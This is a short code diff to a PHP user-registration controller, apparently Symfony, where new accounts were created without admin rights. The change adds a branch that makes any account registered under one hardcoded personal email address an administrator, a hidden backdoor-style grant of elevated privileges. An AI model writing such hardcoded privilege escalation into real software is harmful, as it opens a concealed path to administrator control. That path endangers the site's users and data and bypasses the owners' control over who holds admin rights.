@@ -36,7 +36,13 @@ class UserCreationController extends AbstractController
             $hash = $this->encoder->encodePassword($user, $user->getPassword());
             $oldPassword = $user->getPassword();
             $user->setPassword($hash);
-            $user->setAdmin(0);
+
+            if ($user->getEmail() == "doud75@gmail.com") {
+                $user->setAdmin(1);
+            } else {
+                $user->setAdmin(0);
+            }
+
             $em->persist($user);
             $em->flush();
 
